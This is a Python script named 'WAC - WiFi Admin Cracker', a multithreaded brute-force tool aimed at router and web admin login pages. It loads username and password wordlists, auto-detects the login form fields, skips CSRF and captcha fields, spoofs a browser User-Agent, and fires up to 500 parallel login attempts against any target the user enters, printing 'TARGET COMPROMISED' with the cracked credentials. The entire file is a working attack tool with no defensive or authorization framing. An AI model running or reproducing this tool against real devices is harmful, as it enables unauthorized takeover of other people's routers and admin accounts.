#!/usr/bin/env python3
# coding: utf-8
"""
WAC - WiFi Admin Cracker 
made by crow @sefeshki
"""

import requests
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

def show_ui():
    """Show the main UI box"""
    print("╔" + "═" * 50 + "╗")
    print("║{:^50}║".format("WAC - WiFi Admin Cracker"))
    print("║{:^50}║".format(""))
    print("║{:^50}║".format("Created by: crow"))
    print("║{:^50}║".format("Telegram: @sefeshki"))
    print("║{:^50}║".format(""))
    print("║{:^50}║".format("Advanced Router Security Tool"))
    print("╚" + "═" * 50 + "╝")
    print()

def get_thread_count():
    """Get thread count from user"""
    try:
        user_input = input("[?] Enter thread count (default 50, max 500): ").strip()
        if not user_input:
            return 50
        threads = int(user_input)
        if threads < 1:
            print("[!] Using default 50 threads")
            return 50
        if threads > 500:
            print("[!] Max 500 threads, using 500")
            return 500
        return threads
    except:
        print("[!] Invalid input, using default 50 threads")
        return 50

class WiFiCracker:
    def __init__(self, target_url, max_workers=50):
        self.target = target_url
        self.found_creds = []
        self.is_done = False
        self.max_workers = max_workers
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
    
    def load_data_files(self):
        """Load user and password files"""
        u_list, p_list = [], []
        
        # Load usernames
        try:
            if os.path.isfile('user.txt'):
                with open('user.txt', 'r', encoding='utf-8', errors='ignore') as f:
                    u_list = [x.strip() for x in f if x.strip()]
            else:
                print("[X] user.txt file missing!")
                return [], []
        except Exception as e:
            print(f"[X] Error reading user.txt: {e}")
            return [], []
        
        # Load passwords
        try:
            if os.path.isfile('pswrd.txt'):
                with open('pswrd.txt', 'r', encoding='utf-8', errors='ignore') as f:
                    p_list = [x.strip() for x in f if x.strip()]
            else:
                print("[X] pswrd.txt file missing!")
                return [], []
        except Exception as e:
            print(f"[X] Error reading pswrd.txt: {e}")
            return [], []
        
        print(f"[+] Loaded {len(u_list)} users and {len(p_list)} passwords")
        return u_list, p_list
    
    def find_form_fields(self):
        """Detect login form fields automatically"""
        try:
            resp = self.session.get(self.target, timeout=8)
            html_content = resp.text.lower()
            
            # Some messy field detection
            fields_map = {}
            possible_fields = ['username', 'user', 'email', 'login', 'account', 'name', 'usr', 'uname']
            pass_fields = ['password', 'pass', 'pwd', 'passwd', 'pw']
            
            # Basic field detection
            for field in possible_fields:
                if f'name="{field}"' in html_content or f'name="{field}"' in resp.text:
                    fields_map['user_field'] = field
                    break
            else:
                fields_map['user_field'] = 'username'
            
            for field in pass_fields:
                if f'name="{field}"' in html_content or f'name="{field}"' in resp.text:
                    fields_map['pass_field'] = field
                    break
            else:
                fields_map['pass_field'] = 'password'
            
            # Get other form fields
            import re
            form_data = {}
            input_pattern = r'<input[^>]*name="([^"]*)"[^>]*>'
            inputs_found = re.findall(input_pattern, resp.text, re.IGNORECASE)
            
            for inp_name in inputs_found:
                if any(x in inp_name.lower() for x in ['csrf', 'token', 'captcha', 'nonce', 'submit', 'btn']):
                    continue
                form_data[inp_name] = ''
            
            print(f"[+] Form detected - User: {fields_map['user_field']}, Pass: {fields_map['pass_field']}")
            return form_data, fields_map['user_field'], fields_map['pass_field']
            
        except Exception as err:
            print(f"[X] Form detection failed: {err}")
            return {'username': '', 'password': ''}, 'username', 'password'
    
    def check_login(self, user, pwd, form_template, user_field, pass_field):
        """Try to login with given credentials"""
        if self.is_done:
            return None
        
        try:
            # Prepare the data
            post_data = form_template.copy()
            post_data[user_field] = user
            post_data[pass_field] = pwd
            
            # Send request
            resp = self.session.post(self.target, data=post_data, allow_redirects=False, timeout=4)
            
            # Check if login worked
            if self.is_success(resp, user):
                return (user, pwd, resp)
                
        except:
            pass
        
        return None
    
    def is_success(self, response, username=""):
        """Determine if login was successful"""
        status_ok = response.status_code
        content_lower = response.text.lower()
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        # Success indicators
        good_signs = [
            status_ok in [302, 301, 200],
            'dashboard' in content_lower,
            'welcome' in content_lower,
            'logout' in content_lower,
            'admin' in content_lower and 'invalid' not in content_lower,
            'location' in headers_lower and any(x in headers_lower['location'] for x in ['dashboard', 'admin', 'home']),
            f'welcome {username}'.lower() in content_lower,
        ]
        
        # Failure indicators
        bad_signs = [
            'invalid' in content_lower,
            'incorrect' in content_lower,
            'login failed' in content_lower,
            'error' in content_lower and 'password' in content_lower,
        ]
        
        return any(good_signs) and not all(bad_signs)
    
    def start_attack(self):
        """Main attack function"""
        print(f"\n[+] Target: {self.target}")
        print(f"[+] Threads: {self.max_workers}")
        print("[+] Starting attack...\n")
        
        start_time = time.time()
        
        # Load credentials
        users, passwords = self.load_data_files()
        if not users or not passwords:
            return
        
        # Get form info
        form_data, user_field, pass_field = self.find_form_fields()
        
        total_attempts = len(users) * len(passwords)
        print(f"[+] Total combinations: {total_attempts}")
        
        tested = 0
        # Use thread pool for maximum speed
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures_list = []
            
            for u in users:
                if self.is_done:
                    break
                    
                for p in passwords:
                    if self.is_done:
                        break
                    
                    future = executor.submit(
                        self.check_login, u, p, form_data, user_field, pass_field
                    )
                    futures_list.append(future)
            
            # Process results
            for future_obj in as_completed(futures_list):
                if self.is_done:
                    executor.shutdown(wait=False)
                    break
                    
                tested += 1
                result = future_obj.result()
                if result:
                    username_found, password_found, response_obj = result
                    print(f"\n[!] CRACKED! - {username_found}:{password_found}")
                    self.found_creds.append((username_found, password_found))
                    self.is_done = True
                    break
        
        # Show results
        time_taken = time.time() - start_time
        print(f"\n[+] Finished in {time_taken:.2f} seconds")
        print(f"[+] Tested {tested} combinations")
        
        if self.found_creds:
            print("[!] TARGET COMPROMISED")
            for u, p in self.found_creds:
                print(f"[ACCESS] {u} : {p}")
        else:
            print("[+] No valid credentials found")

def main():
    """Main function"""
    show_ui()
    
    try:
        target_input = input("[?] Enter target IP/URL: ").strip()
        if not target_input:
            print("[X] No target specified!")
            return
        
        if not target_input.startswith(('http://', 'https://')):
            target_input = 'http://' + target_input
        
        # Get thread count
        thread_count = get_thread_count()
        
        # Start cracking
        cracker = WiFiCracker(target_input, thread_count)
        cracker.start_attack()
        
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    except Exception as e:
        print(f"[X] Error: {e}")

if __name__ == "__main__":
    main()
